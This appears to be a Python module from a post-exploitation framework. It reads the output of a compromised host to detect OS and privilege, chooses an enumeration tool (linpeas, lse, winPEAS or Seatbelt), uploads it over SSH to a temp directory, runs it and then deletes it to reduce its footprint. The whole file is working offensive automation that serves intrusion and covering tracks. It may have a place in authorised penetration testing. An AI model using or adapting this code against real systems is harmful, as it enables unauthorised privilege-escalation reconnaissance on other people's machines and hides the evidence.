import os
import time


TOOLS = {
    'linpeas': '/opt/postex-tools/linpeas.sh',
    'lse': '/opt/postex-tools/lse.sh',
    'winpeas': '/opt/postex-tools/winpeas.exe',
    'seatbelt': '/opt/postex-tools/Seatbelt.exe'  # Note capital 'S'
}


def detect_access_context(post_exploitation):
    context = {'os': 'unknown', 'privilege': 'user', 'shell': 'meterpreter'}
    output = '\n'.join(post_exploitation.values()).lower()

    if 'windows' in output:
        context['os'] = 'windows'
    elif 'linux' in output or 'ubuntu' in output or 'debian' in output:
        context['os'] = 'linux'

    if 'uid=0' in output or 'root' in output or 'nt authority\\system' in output:
        context['privilege'] = 'root'

    if 'meterpreter' not in output and ('$' in output or '#' in output):
        context['shell'] = 'shell'

    return context

def choose_best_tool(context):
    if context['os'] == 'linux':
        return 'linpeas' if context['privilege'] == 'root' else 'lse'
    elif context['os'] == 'windows':
        return 'winpeas' if context['privilege'] == 'root' else 'seatbelt'
    return None

def upload_and_run_tool(ssh, tool_name, os_type):
    """Upload and execute a post-exploitation tool on the target system.
    
    Args:
        ssh: SSHClient instance for file transfer and command execution
        tool_name: Name of the tool to use (must be in TOOLS dict)
        os_type: Target OS type ('linux' or 'windows')
    
    Returns:
        str: Tool output or error message
    """
    # Get local tool path
    local_path = TOOLS.get(tool_name)
    if not local_path or not os.path.exists(local_path):
        return f"❌ Tool '{tool_name}' not available on disk"

    # Set remote path based on OS
    if os_type == 'linux':
        remote_path = f"/tmp/{os.path.basename(local_path)}"
        cmd = f"chmod +x {remote_path} && {remote_path}"
    else:
        remote_path = f"C:\\Windows\\Temp\\{os.path.basename(local_path)}"
        cmd = f"{remote_path} /group=all"

    try:
        # Upload the tool
        with open(local_path, 'rb') as f:
            ssh.upload_file(remote_path, f.read())

        # Execute the tool
        output = ssh.execute_command(cmd, timeout=300)

        # Clean up to reduce footprint
        try:
            if os_type == 'linux':
                ssh.execute_command(f"rm -f {remote_path}")
            else:
                ssh.execute_command(f'del "{remote_path}"')
        except Exception as e:
            output += f"\n⚠️ Cleanup warning: {str(e)}"

        return output

    except Exception as e:
        return f"❌ Error: {str(e)}"
